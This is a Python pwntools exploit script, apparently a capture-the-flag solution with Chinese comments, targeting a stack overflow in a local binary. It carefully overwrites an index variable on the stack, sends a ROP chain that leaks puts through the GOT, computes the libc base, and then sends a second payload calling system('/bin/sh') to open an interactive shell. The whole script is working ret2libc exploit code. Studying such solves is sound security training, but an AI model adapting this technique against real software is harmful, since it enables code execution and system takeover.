from pwn import *

pad = 0x30

io = process("./a.out")
elf = ELF("./a.out")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

pop_rdi_ret = 0x0000000000401313
pop_rsi_r15_ret = 0x0000000000401311

test_th_addr = elf.symbols["test_thread"]
print(hex(test_th_addr))

puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
print(hex(puts_plt))
print(hex(puts_got))

#这里是这道题容易失误的地方，在这里我们不能使用上面的pad随便步过：因为通过IDA分析我们可以发现在覆写s[40]时会覆盖i的值，即i在s数组初始位置的高地址处，这会导致i的突然变化。因此在pad到i的位置时，我们最希望的情况是让其接着继续写，这就需要在这里填入此时i的值，让其执行read函数之后保持i的值没有变化。所以由此知：当覆写到i的写入地址时，i的值对应为44，那么此时我们覆写时写入的应该是44，对应的就是'\x2c'，即0x2c，随后继续进行正常的写入即可！！！
##特别注意！！！char是一个字节，而int是4个字节！！！所以：(b"\x2c" + b'\x00'*3) = p32(44) 是将其打包成了4字节int类型的44！！！
payload1 = b'a'*44 + (b"\x2c" + b'\x00'*3) + b'a'*8 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(test_th_addr)
payload1 = b"a"*44 + p32(44) + b"b"*8 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(test_th_addr)
print(p32(44))
#payload1 = b'a'*44 + b"\x30" + b'a'*8 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(test_th_addr)


io.sendline(payload1)

recv_str = io.recvuntil(b"\n")
print(len(recv_str))
print(recv_str)

puts_addr_str_flag1 = io.recvuntil("\x7f")
print(puts_addr_str_flag1)
#防止含有不可见或隐藏字符
puts_addr_str_flag2 = puts_addr_str_flag1[-6:]
print(puts_addr_str_flag2)
print(type(puts_addr_str_flag2))
puts_addr_str_flag3 = puts_addr_str_flag2.ljust(8,b"\x00")
print(puts_addr_str_flag3)

puts_addr = u64(puts_addr_str_flag3)
libc_base = puts_addr - libc.sym["puts"]
print(hex(puts_addr))
print(hex(libc_base))

binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
sys_addr = libc_base + libc.symbols['system']

payload2 = b'a'*44 + b"\x2c" + b"\x00"*3 + b'a'*8 + p64(pop_rsi_r15_ret) + p64(0)*2 + p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr)

io.sendline(payload2)
io.interactive()

